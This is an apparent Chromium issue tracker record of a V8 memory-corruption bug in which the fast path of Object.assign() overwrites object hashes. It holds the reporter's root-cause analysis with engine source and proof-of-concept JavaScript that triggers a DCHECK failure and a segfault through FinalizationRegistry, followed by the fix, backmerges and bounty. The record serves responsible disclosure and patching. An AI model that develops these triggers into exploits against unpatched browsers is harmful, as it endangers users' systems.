# Incorrect implementation of the fast path in Object.assign() lead to memory corruption.

| Field | Value |
|-------|-------|
| **Issue ID** | [383647255](https://issues.chromium.org/issues/383647255) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ol...@chromium.org |
| **Created** | 2024-12-12 |
| **Bounty** | $20,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

## 1 `Object.assign()`

This vulnerability is located in the fast path implementation of `Object.assign()`. Consider the following example:

```
let to = {};
let from = {0: 0};
Object.assign(to, from);
%DebugPrint(from);

```

If the object being assigned is `{}`, then after executing `Object.assign()`, the `transitions` array of the `from` object's hidden class will add `Sidestep transitions`, where:

- `Object.assign-map` represents the hidden class of `to` after assignment.
- `Object.assign-validity-cell`: indicates whether it is still valid.

```
0x37c000882735: [Map]
 - map: 0x37c0008819b5 <MetaMap (0x37c000881a05 <NativeContext[300]>)>
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - unused property fields: 4
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - back pointer: 0x37c000000011 <undefined>
 - prototype_validity cell: 0x37c000000a81 <Cell value= 1>
 - instance descriptors (own) #0: 0x37c000000779 <DescriptorArray[0]>
 - transitions #0: 0x37c00088275d <TransitionArray[3]>
   Transitions #0:
   Prototype transitions #1: 0x37c000882771 <WeakFixedArray[3]>
   Sidestep transitions #3: 0x37c000048f25 <WeakFixedArray[3]>
     Clone-object-IC-map -> 0
     Object.assign-map -> [weak] 0x37c000882735 <Map[28](HOLEY_ELEMENTS)>
     Object.assign-validity-cell -> [weak] 0x37c000199605 <Cell value= 0>
 - prototype: 0x37c000882909 <Object map = 0x37c000881f15>
 - constructor: 0x37c000882429 <JSFunction Object (sfi = 0x37c00002adf9)>
 - dependent code: 0x37c000000755 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0


```

When `Object.assign({}, from)` is executed again, various checks will be performed first. If the `Sidestep transitions` of `from_map` are still valid, it will enter the fast path of `Object.assign()` to implement object assignment.

```
TF_BUILTIN(ObjectAssign, ObjectBuiltinsAssembler) {
  ...
  TNode<JSReceiver> to = ToObject_Inline(context, target);
  ...

  Label done_fast_path(this), slow_path(this);
  GotoIfForceSlowPath(&slow_path);
  {
    TNode<JSReceiver> from = ToObject_Inline(context, source);
    TNode<Map> from_map = LoadMap(from);
    ...    // all kinds of check

    TVARIABLE(Map, clone_map);
    {
      // Load the Transitions array from from_map, go to the runtime branch if it doesn't exist
      TNode<MaybeObject> maybe_transitions = LoadMaybeWeakObjectField(from_map, Map::kTransitionsOrPrototypeInfoOffset);
      TNode<HeapObject> maybe_transitions2 = GetHeapObjectIfStrong(maybe_transitions, &runtime_map_lookup); 
      GotoIfNot(IsTransitionArrayMap(LoadMap(maybe_transitions2)), &runtime_map_lookup);

      TNode<WeakFixedArray> transitions = CAST(maybe_transitions2);

      // Get side_step_transitions from Transitions Array, if it's still SMI, then go to the runtime branch
      TNode<Object> side_step_transitions = CAST(LoadWeakFixedArrayElement(
          transitions,
          IntPtrConstant(TransitionArray::kSideStepTransitionsIndex)));
      GotoIf(TaggedIsSmi(side_step_transitions), &runtime_map_lookup);

      // Load Object.assign-map from side_step_transitions, which is the map of 'to' after assignment
      TNode<MaybeObject> maybe_target_map = LoadWeakFixedArrayElement(
          CAST(side_step_transitions),
          IntPtrConstant(SideStepTransition::index_of(
              SideStepTransition::Kind::kObjectAssign)));
      // If maybe_target_map = unreachable, then it means it can't fast clone, go to the slow branch 
      GotoIf(TaggedEqual(maybe_target_map,
                         SmiConstant(SideStepTransition::Unreachable)),
             &slow_path);

      // If maybe_target_map = Empty, then it means it hasn't been calculated yet, go to the runtime_map_lookup branch
      GotoIf(
          TaggedEqual(maybe_target_map, SmiConstant(SideStepTransition::Empty)),
          &runtime_map_lookup);

      // target_map is the hidden class after copying from object to to object
      TNode<Map> target_map =
          CAST(GetHeapObjectAssumeWeak(maybe_target_map, &runtime_map_lookup));
      // Deprecated, go to the runtime_map_lookup branch
      GotoIf(IsDeprecatedMap(target_map), &runtime_map_lookup);

      // Get the Cell corresponding to Object.assign-validity-cell from the side_step_transitions array
      TNode<MaybeObject> maybe_validity_cell = LoadWeakFixedArrayElement(
          CAST(side_step_transitions),
          IntPtrConstant(SideStepTransition::index_of(
              SideStepTransition::Kind::kObjectAssignValidityCell)));
      // Check if side_step_transitions is still valid
      TNode<Cell> validity_cell = CAST(
          GetHeapObjectAssumeWeak(maybe_validity_cell, &runtime_map_lookup));
      GotoIfNot(TaggedEqual(LoadCellValue(validity_cell),
                            SmiConstant(Map::kPrototypeChainValid)),
                &runtime_map_lookup);
      // Finally found clone_map, can go to the fast path
      clone_map = target_map;
    }
    Goto(&continue_fast_path);
    ...

    // Check is done, enter the fast path to assign the object
    BIND(&continue_fast_path);

    FastCloneJSObject(
        from, 
        from_map, 
        clone_map.value(),
        [&](TNode<Map> map, TNode<HeapObject> properties, TNode<FixedArray> elements) {
          StoreMap(to, clone_map.value());    // Write to the map field of the 'to' object
          StoreJSReceiverPropertiesOrHash(to, properties);   // Write to the properties field of the 'to' object
          StoreJSObjectElements(CAST(to), elements); // Write to the elements field of the 'to' object
          return to;
        },
        false /* target_is_new */
    );
    ... 
  }
  ... 
}

```

The vulnerability appears in `FastCloneJSObject()`, which has four parameters:

1. `from`: the source object
2. `from_map`: the hidden class of the source object
3. `clone_map.value()`: the hidden class of the target object after assignment
4. A lambda method:
   1. `FastCloneJSObject()` will create objects for the target object's `map`, `properties`, `elements` fields and then call back this lambda method.
   2. This method is responsible for initializing the target object and will directly write the passed `map`, `properties`, `elements` parameters into the corresponding fields of the target object.

We focus on `FastCloneJSObject()`'s handling of the `properties` field.

```
template <typename Function>
TNode<Object> CodeStubAssembler::FastCloneJSObject(
    TNode<HeapObject> object, TNode<Map> source_map, TNode<Map> target_map,
    const Function& materialize_target, bool target_is_new) {
  ...

  // Copy the PropertyArray backing store. The source PropertyArray
  // must be either an Smi, or a PropertyArray.
  Comment("FastCloneJSObject: cloning properties");
  TNode<Object> source_properties =
      LoadObjectField(object, JSObject::kPropertiesOrHashOffset);
  {
    GotoIf(TaggedIsSmi(source_properties), &done_copy_properties);
    GotoIf(IsEmptyFixedArray(source_properties), &done_copy_properties);

    // This fastcase requires that the source object has fast properties.
    TNode<PropertyArray> source_property_array = CAST(source_properties);

    TNode<IntPtrT> length = LoadPropertyArrayLength(source_property_array);
    GotoIf(IntPtrEqual(length, IntPtrConstant(0)), &done_copy_properties);

    TNode<PropertyArray> property_array = AllocatePropertyArray(length);
    FillPropertyArrayWithUndefined(property_array, IntPtrConstant(0), length);
    CopyPropertyArrayValues(source_property_array, property_array, length,
                            SKIP_WRITE_BARRIER, DestroySource::kNo);
    var_properties = property_array;
  }
  ...

  Comment("FastCloneJSObject: initialize the target object");
  TNode<JSReceiver> target = materialize_target(
      target_map, var_properties.value(), var_elements.value());
  ...
}

```

We found that **when the `JSObject::kPropertiesOrHashOffset` field of the `source` object is not an SMI (in other words, it has not been used to record the hash value of the object), then `var_properties` is the address of the `PropertyArray` object. The subsequent `materialize_target` method will directly write the `PropertyArray` object into the `JSObject::kPropertiesOrHashOffset` field of the `to` object.**

## 2 overwrite `properties_or_hash` field

The above process overlooks a special case: **What happens if the `JSObject::kPropertiesOrHashOffset` field of the `to` object is used to record the hash value of the object?**

The `properties_or_hash` field in `JSObject` is a reused field:

- If `properties_or_hash` is an SMI, then this field is used to record the hash value of the object.
- If `properties_or_hash` is a tagged pointer, then this field is a pointer to the `properties backing storage`.

```
extern class JSReceiver extends HeapObject {
  properties_or_hash: SwissNameDictionary|FixedArrayBase|PropertyArray|Smi;
}

```

When `JSObject::properties_or_hash` points to an empty array and there is a need to record the hash value of the object, the hash value will be directly written into the `properties_or_hash` field.

Later, if there is a need to add properties, `JSObject::properties_or_hash` will point to the `PropertyArray` object, and the `hash` value will be moved into the `PropertyArray` object.

```
int GetIdentityHashHelper(Tagged<JSReceiver> object) {
  DisallowGarbageCollection no_gc;
  Tagged<Object> properties = object->raw_properties_or_hash();
  if (IsSmi(properties)) {
    return Smi::ToInt(properties);
  }

  if (IsPropertyArray(properties)) {
    return Cast<PropertyArray>(properties)->Hash();
  }

  if (IsPropertyDictionary(properties)) {
    return Cast<PropertyDictionary>(properties)->Hash();
  }

  if (IsGlobalDictionary(properties)) {
    return Cast<GlobalDictionary>(properties)->Hash();
  }
  ...

  return PropertyArray::kNoHashSentinel;
}

```

Therefore, in the fast path of `Object.assign()`, the `hash` value recorded in `properties_or_hash` of the `to` object is directly overwritten as a pointer, causing the hash value of `to` to be lost.

So, this vulnerability provides us with such a primitive: **if `obj = {}`, then calling `Object.assign(obj, {})` twice, we can overwrite the hash value recorded in the `raw_properties_or_hash` field of `obj`**.

Here is the Proof of Concept (POC):

```
// WeakMap
let weakMap = new WeakMap();

let obj = {};
// The  properties_or_hash field of obj is SMI, used to record hash
weakMap.set(obj, 'value');

function overwrite_obj_hash(obj) {
    let from = {};
    // generate Sidestep transitions in from_map
    Object.assign(obj, from);
    // The properties_or_hash field of obj is overwritten with the address of an object.
    Object.assign(obj, from);
}

// return true
print(weakMap.has(obj));

overwrite_obj_hash(obj);

// return false
print(weakMap.has(obj));

```

But you might not like this POC because it doesn't crash. So let's go a step further to prove that this is a security vulnerability.

## 3 DCHECK Fail

This vuln breaks the assumptions about `JSObject::properties_or_hash` in the code. The `poc.js` in REPRODUCTION CASE only shows one situation. Next, I will explain why DCHECK failed.

The crash occurs in the handling of `unregister_token` in `FinalizationRegistry`.

`FinalizationRegistry` is used to trigger a specific callback function when an object is GCed. The related data structure is as follows:

```
extern class JSFinalizationRegistry extends JSObject {
    native_context: NativeContext;
    cleanup: Callable; // The callback function to be called during garbage collection
    active_cells: Undefined|WeakCell; // The linked list of all live objects registered to the FinalizationRegistry
    cleared_cells: Undefined|WeakCell; // If objects in active_cells are garbage collected but the cleanup callback is not called, they would be placed in this linked list
    key_map: Object; // dictionary Map: unregister_token=>WeakCell
    
    // The linked list of FinalizationRegistries that need to be cleaned up
    next_dirty: Undefined|JSFinalizationRegistry;
    flags: SmiTagged<FinalizationRegistryFlags>;
}

```

`WeakCell` stores the information registered by a `registry.register(target, holdings, unregister_token)` call.

```
extern class WeakCell extends HeapObject {
    finalization_registry: Undefined|JSFinalizationRegistry; // The FinalizationRegistry to which this belongs
    target: Undefined|JSReceiver|Symbol; // The target object being observed
    unregister_token: Undefined|JSReceiver|Symbol; // The token used for unregistration
    holdings: JSAny; // The parameter for the cleanup callback
    
    // Used to store WeakCell in the active_cells and cleared_cells lists of JSFinalizationRegistry
    // as a doubly-linked list
    prev: Undefined|WeakCell;
    next: Undefined|WeakCell;
    
    // JSFinalizationRegistry::key is a hash table, hash collisions are resolved through a linked list
    // For unregister_tokens with the same hash, the corresponding WeakCells are stored as a doubly-linked list
    key_list_prev: Undefined|WeakCell;
    key_list_next: Undefined|WeakCell;
}

```

The `FinalizationRegistry::key_map` field points to a `SimpleNumberDictionary` object, which is used to implement the mapping from `unregister_token` to `WeakCell`.

Assume that an object is registered with `registry.register(target, undefined, unreg_token)`, and subsequently the `target` object is garbage collected. At this point, it is impossible to call `registry.unregister(unreg_token)` to unregister it, so the `RemoveCellFromUnregisterTokenMap()` method is called to remove `unreg_token` from `FinalizationRegistry::key_map`.

The relevant handling code is as follows.

```
void JSFinalizationRegistry::RemoveCellFromUnregisterTokenMap(
    Isolate* isolate, Tagged<WeakCell> weak_cell) {
  DisallowGarbageCollection no_gc;
  Tagged<Undefined> undefined = ReadOnlyRoots(isolate).undefined_value();

  // weak_cell->key_list_prev==undefined means weak_cell is the head node of a hash linked list in a slot
  if (IsUndefined(weak_cell->key_list_prev(), isolate)) { 
    Tagged<SimpleNumberDictionary> key_map = Cast<SimpleNumberDictionary>(this->key_map());
    // unregister_token is an object, its hash value is obtained through the properties_or_hash field
    Tagged<HeapObject> unregister_token = weak_cell->unregister_token();
    uint32_t key = Smi::ToInt(Object::GetHash(unregister_token));
    // Query the corresponding table entry based on the key
    InternalIndex entry = key_map->FindEntry(isolate, key);
    // At this point, properties_or_hash is modified to FixedArray[0] by Object.assign(), so it cannot be found, DCHECK fails
    DCHECK(entry.is_found());    

    if (IsUndefined(weak_cell->key_list_next(), isolate)) { // There is only weak_cell in the linked list pointed to by the slot
      // weak_cell is the only one associated with its key; remove the key
      // from the hash table.
      key_map->ClearEntry(entry);
      key_map->ElementRemoved();
    } else { // There is more than one weak_cell in the linked list pointed to by the slot, but now weak_cell is to be deleted
      // The next node of weak_cell becomes the head node
      Tagged<WeakCell> next = Cast<WeakCell>(weak_cell->key_list_next());
      // Clear the prev pointer
      next->set_key_list_prev(undefined);
      // Set the value of the entry to next
      key_map->ValueAtPut(entry, next);
    }
  } else { // weak_cell->key_list_prev!=undefined means weak_cell is a node in the middle of the hash linked list
    ...
  }
  ...
}

```

We need to pay attention to the check `DCHECK(entry.is_found())`.

`RemoveCellFromUnregisterTokenMap()` is only used to handle the `unregister_token` field of the `WeakCell` taken from the `JSFinalizationRegistry::cleared_cells` linked list. When a `WeakCell` is inserted into the `JSFinalizationRegistry` linked list, it calculates the hash value of the `unregister_token` and inserts it into `FinalizationRegistry::key_map`.

Therefore, it is assumed here that the `unregister_token` of the `WeakCell` can definitely find the corresponding entry in `FinalizationRegistry::key_map`. However, through the vulnerability of `Object.assign()`, we overwrite the hash value of `unregister_token` recorded in `properties_or_hash`, so the corresponding entry cannot be found, and DCHECK fails.

This is what happens in the POC.

## 4 SEGV Fault

Since the hash value of `unregister_token` is overridden, it cannot find the corresponding entry in `FinalizationRegistry::key_map`, so the returned `entry` is actually `-1`.

In the release build of v8, it will continue to execute after `DCHECK(entry.is_found());`

`SimpleNumberDictionary` is based on `FixedArray` implementation, an `Entry` occupies two `slots`. If `entry=-1`, then when writing the key and value of this Entry, it will actually overwrite the `num_del` and `capacity` fields, damaging the metadata fields of the dictionary.

```
JSFinalizationRegistry::key_map
    |
    |    FixedArray
    +-> +-----------+
        | num_eles  | 1
        +-----------+
        | num_del   | <= overwrite
        +-----------+
        | capacity  | <= overwrite 
        +-----------+ 
        |   key0    |    
        +-----------+    
        |  value0   |    
        +-----------+
        |    ...    |

```

This will cause the `capacity` of `SimpleNumberDictionary` to be exceptionally large. For this, I constructed the following POC. If it runs in the `release` build of `v8`, it will trigger a segmentation fault.

```
/* poc_SEGV.js */
function CleanUp() {
    print("CleanUp");

    // trigger SEGV fault
    for(let i=0; i<10; i++) {
        registry.register({"target": 3+i}, 3+i, {"token": 3+i});
    }
}

const registry = new FinalizationRegistry(CleanUp);

let target1 = {
    "a": 1
};
let target2 = {
    "a": 2
};

let unreg_token = {
};

registry.register(target1, 1, unreg_token);
registry.register(target2, 2, unreg_token);

// overwrite properties_or_hash field of unreg_token
for(let i=0; i<2; i++) 
    Object.assign(unreg_token, {});   

target2 = undefined;
gc({type: "major"});

/*
./d8 \
    --expose-gc \
    ./poc_SEGV.js
*/

```
## 5 Commit Bisect

The root cause of the vulnerability lies in the fast path handling of `Object.assign({}, ...)`. This feature was introduced in commit `b8431f57e0fc19223e9371ccaf7e99a9b9a061f0`.

VERSION

The vulnerability originates from commit `b8431f57e0fc19223e9371ccaf7e99a9b9a061f0` up to the latest.

According to the commit history, I found that `clone_object_sidestep_transitions` was turned off by default for a period of time, and it was only recently turned on by default. Therefore, if you can't trigger it, please add the `--clone-object-sidestep-transitions` option.

REPRODUCTION CASE

POC:

```
/* poc.js */ 

// Prepare a finalization registry
function CleanUp() {
    print("CleanUp");
}
const registry = new FinalizationRegistry(CleanUp);

// The target object to be registered
let target = {
};
// The token used when unregistering from the registry
let unreg_token = {
};
// Register to registry: trigger the callback function when target is GC'ed
registry.register(target, undefined, unreg_token);

// The first time it is executed, it writes sidestep transition in map of unreg_token
// The second time it enters the fast path of Object.assign()
// properties_or_hash field of unreg_token is overwritten as FixedArray[0]
for(let i=0; i<2; i++) 
    Object.assign(unreg_token, {});   

// Let the target be garbage collected, then trigger the registry's finalization
// At this time, it will delete the entry from UnregisterTokenMap with unreg_token's properties_or_hash as the key
// But at this point, properties_or_hash has been overwritten as a pointer, it cannot be found, so DCHECK fails
target = undefined;
gc({type: "major"});

```

run as:

```
./d8 \
    --expose-gc \
    ./poc.js

```

you will get crash:

```
# Fatal error in ../../src/objects/js-weak-refs.cc, line 106
# Debug check failed: entry.is_found().

```

CREDIT INFORMATION

Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: 303f06e3

## Timeline

### cl...@appspot.gserviceaccount.com (2024-12-12)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4880162927607808.

### 24...@project.gserviceaccount.com (2024-12-12)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2024-12-12)

Detailed Report: https://clusterfuzz.com/testcase?key=4880162927607808

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  entry.is_found() in js-weak-refs.cc
  v8::internal::JSFinalizationRegistry::RemoveCellFromUnregisterTokenMap
  v8::internal::JSFinalizationRegistry::PopClearedCell
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=96450:96451

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4880162927607808

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### pe...@google.com (2024-12-13)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-12-13)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ap...@google.com (2024-12-13)

[Details redacted due to bug visibility]

Change-Id: Id60f5b92951359960af1f178cae7e078049cf05f
https://chrome-internal-review.googlesource.com/7893749


### ol...@chromium.org (2024-12-13)

Fixed in <https://chromium-review.googlesource.com/c/v8/v8/+/6092869>

Thanks 303f06e3 for the excellent work that went into this report!

### 24...@project.gserviceaccount.com (2024-12-14)

ClusterFuzz testcase 4880162927607808 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=97757:97758

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### pe...@google.com (2024-12-14)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M130. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M131. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M132. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [130, 131, 132].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ol...@chromium.org (2024-12-16)

1. <https://chromium-review.googlesource.com/c/v8/v8/+/6092869>
2. yes
   3-5. no

### am...@chromium.org (2024-12-16)

https://crrev.com/c/6092869 approved for merges; please merge to branches 13.2, 13.1, and 13.0 asap so this fix can go out in this week's updates before release freeze 

giving the timing of when this fix was landed, if backmerged immediately to 13.1, it will be shipped in this week's Stable channel update otherwise it will be shipped in the update following release freeze of the first Tuesday in January.

### is...@chromium.org (2024-12-16)

Back-merges are on the way:

M130: <https://crrev.com/c/6097572>

M131: <https://crrev.com/c/6098273>

M132: <https://crrev.com/c/6097573>

### is...@chromium.org (2024-12-16)

All three have been back-merged.

### ap...@google.com (2024-12-16)

Project: v8/v8  

Branch: refs/branch-heads/13.1  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6098273>

Merged: [ic] fix Object.assign clearing object hashes

---


Expand for full commit details
```
Merged: [ic] fix Object.assign clearing object hashes 
 
The Object.assign fastcase should not override the hash of the to 
object. 
 
Bug: 383647255 
(cherry picked from commit 357d0dd4bc7f64eb81cdf49c5cf3699cf151909d) 
 
Change-Id: Icd6e9cb9a528dac7cd6aa2baae11ebc74bd4655d 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6098273 
Commit-Queue: Igor Sheludko <ishell@chromium.org> 
Reviewed-by: Camillo Bruni <cbruni@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.1@{#36} 
Cr-Branched-From: 7998da66cb2883ef9734743857713b1194212d9a-refs/heads/13.1.201@{#1} 
Cr-Branched-From: 5e9af2a913539cf67091def99b62f49afece6f56-refs/heads/main@{#96554}

```

---

Files:

- M `src/builtins/builtins-object-gen.cc`

---

Hash: 9cff74023cbc93e28583505aded4e12a4333f86e  

Date:  Fri Dec 13 13:19:30 2024


---

### ap...@google.com (2024-12-16)

Project: v8/v8  

Branch: refs/branch-heads/13.0  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6097572>

Merged: [ic] fix Object.assign clearing object hashes

---


Expand for full commit details
```
Merged: [ic] fix Object.assign clearing object hashes 
 
The Object.assign fastcase should not override the hash of the to 
object. 
 
Bug: 383647255 
(cherry picked from commit 357d0dd4bc7f64eb81cdf49c5cf3699cf151909d) 
 
Change-Id: I2bbf10614d7997a396800cef33144875309010d9 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6097572 
Reviewed-by: Camillo Bruni <cbruni@chromium.org> 
Commit-Queue: Igor Sheludko <ishell@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.0@{#43} 
Cr-Branched-From: 4be854bd71ea878a25b236a27afcecffa2e29360-refs/heads/13.0.245@{#1} 
Cr-Branched-From: 1f5183f7ad6cca21029fd60653d075730c644432-refs/heads/main@{#96103}

```

---

Files:

- M `src/builtins/builtins-object-gen.cc`

---

Hash: cb0d9e1d7b8889192e417363d0d7280a2ea114fa  

Date:  Fri Dec 13 13:19:30 2024


---

### ap...@google.com (2024-12-16)

Project: v8/v8  

Branch: refs/branch-heads/13.2  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6097573>

Merged: [ic] fix Object.assign clearing object hashes

---


Expand for full commit details
```
Merged: [ic] fix Object.assign clearing object hashes 
 
The Object.assign fastcase should not override the hash of the to 
object. 
 
Bug: 383647255 
(cherry picked from commit 357d0dd4bc7f64eb81cdf49c5cf3699cf151909d) 
 
Change-Id: I7756c7b7507cbbec84d22f9a45a94bb55220a819 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6097573 
Commit-Queue: Igor Sheludko <ishell@chromium.org> 
Reviewed-by: Camillo Bruni <cbruni@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.2@{#40} 
Cr-Branched-From: 24068c59cedad9ee976ddc05431f5f497b1ebd71-refs/heads/13.2.152@{#1} 
Cr-Branched-From: 6054ba94db0969220be4f94dc1677fc4696bdc4f-refs/heads/main@{#97085}

```

---

Files:

- M `src/builtins/builtins-object-gen.cc`

---

Hash: ccc23e073c0e50bdd4c5a6d43acbaf7974341747  

Date:  Fri Dec 13 13:19:30 2024


---

### am...@chromium.org (2024-12-16)

Thanks so much for the quick backmerge response! 

### pe...@google.com (2024-12-16)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### qk...@google.com (2024-12-17)

Labeling as LTS-NotApplicable-126 because the suspected CL[1] was not merged to M126 according to the description.

[1] https://chromium-review.googlesource.com/c/v8/v8/+/5476494 (b8431f57e0fc19223e9371ccaf7e99a9b9a061f0)

### ol...@chromium.org (2024-12-17)

Thanks for taking care of the merges.

### sp...@google.com (2024-12-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $20000.00 for this report.

Rationale for this decision:
high quality of report of a security issue in V8 impacting Stable and older versions of Chrome


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-12-19)

Congratulations 303f06e3! Thanks for your efforts on another excellent report. We appreciate your efforts and that you've reported this issue to us -- great work!

### ch...@google.com (2025-03-23)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### dx...@google.com (2026-05-29)

Project: v8/v8  

Branch:  main  

Author:  Michael Lippautz [mlippautz@chromium.org](mailto:mlippautz@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7883043>

[test] Last batch of regression tests

---


Expand for full commit details
```
     
    TAG=AGY 
     
    Bug: 517688821 
     
    Bug: 40061466 
    Bug: 40066473 
    Bug: 342456991 
    Bug: 343507800 
    Bug: 366381662 
    Bug: 368311899 
    Bug: 372269618 
    Bug: 383647255 
    Bug: 392521083 
    Bug: 398999390 
    Bug: 40059920 
    Bug: 40060821 
    Bug: 40064370 
    Bug: 40065138 
    Bug: 40282100 
    Bug: 40892749 
    Bug: 41484971 
    Bug: 420636529 
    Bug: 42203224 
    Bug: 423459708 
    Bug: 450328966 
    Bug: 452296415 
    Bug: 469143679 
    Bug: 476233066 
    Bug: 478659010 
    Bug: 485267831 
    Bug: 508811477 
    Change-Id: I692cb14ebeac04eaa77c867e9377ebd19b4b909b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7883043 
    Auto-Submit: Michael Lippautz <mlippautz@chromium.org> 
    Commit-Queue: Michael Lippautz <mlippautz@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#107659}

```

---

Files:

- A `test/mjsunit/compiler/regress-40061466.js`
- A `test/mjsunit/maglev/regress-40066473.js`
- A `test/mjsunit/regress/regress-342456991.js`
- A `test/mjsunit/regress/regress-343507800.js`
- A `test/mjsunit/regress/regress-366381662.js`
- A `test/mjsunit/regress/regress-368311899.js`
- A `test/mjsunit/regress/regress-372269618.js`
- A `test/mjsunit/regress/regress-383647255.js`
- A `test/mjsunit/regress/regress-392521083.js`
- A `test/mjsunit/regress/regress-398999390.js`
- A `test/mjsunit/regress/regress-40059920.js`
- A `test/mjsunit/regress/regress-40060821.js`
- A `test/mjsunit/regress/regress-40064370.js`
- A `test/mjsunit/regress/regress-40065138.js`
- A `test/mjsunit/regress/regress-40282100.js`
- A `test/mjsunit/regress/regress-40892749.js`
- A `test/mjsunit/regress/regress-41484971.js`
- A `test/mjsunit/regress/regress-420636529.js`
- A `test/mjsunit/regress/regress-42203224.js`
- A `test/mjsunit/regress/regress-423459708.js`
